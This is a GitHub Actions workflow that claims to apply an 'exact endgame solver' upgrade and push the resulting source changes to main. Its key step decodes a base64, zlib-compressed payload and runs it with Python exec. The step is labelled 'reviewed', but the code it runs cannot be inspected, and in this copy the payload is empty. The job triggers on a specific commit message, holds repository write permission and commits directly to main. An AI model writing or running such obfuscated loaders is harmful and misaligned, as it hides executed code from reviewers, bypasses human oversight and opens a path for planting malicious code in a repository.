name: Apply exact endgame solver

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/apply-exact-endgame.yml

permissions:
  contents: write

concurrency:
  group: apply-exact-endgame
  cancel-in-progress: false

jobs:
  apply:
    if: github.event.head_commit.message == 'Run exact outcome upgrade'
    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
      - name: Check out repository
        uses: actions/checkout@v6
        with:
          fetch-depth: 2

      - name: Apply reviewed exact-search changes
        shell: python
        run: |
          import base64
          import zlib
          payload = ""
          exec(compile(zlib.decompress(base64.b64decode(payload)), '<exact-upgrade>', 'exec'))

      - name: Set up Node.js
        uses: actions/setup-node@v6
        with:
          node-version: 24
          cache: npm

      - name: Install
        run: npm ci

      - name: Validate
        run: |
          npm run ci
          git diff --check

      - name: Publish tested source changes
        shell: bash
        run: |
          set -euo pipefail
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add \
            src/bitboard.js \
            src/app.js \
            scripts/perfect-book.mjs \
            tests/bitboard.test.js \
            tests/perfect-book-generator.test.js \
            package.json \
            package-lock.json \
            README.md \
            docs/PERFECT_PLAY.md
          git commit -m 'Add exact outcome endgame solver'
          git push origin HEAD:main
